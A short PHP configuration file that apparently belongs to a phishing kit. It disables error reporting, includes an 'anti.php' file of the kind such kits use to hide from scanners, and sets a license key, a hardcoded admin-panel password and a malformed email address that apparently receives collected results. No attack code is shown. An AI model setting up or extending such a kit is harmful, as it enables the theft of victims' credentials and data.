<?php
//---------------------
//Do not change it
error_reporting(0);
include 'anti.php';
$license = '42334-22156-24432';
//----------------------
//Change it as per your needs
$adminpanelpassword = "emailchecks";
$email = "email@bigdreams4477@proton.me";
//----------------------

 ?>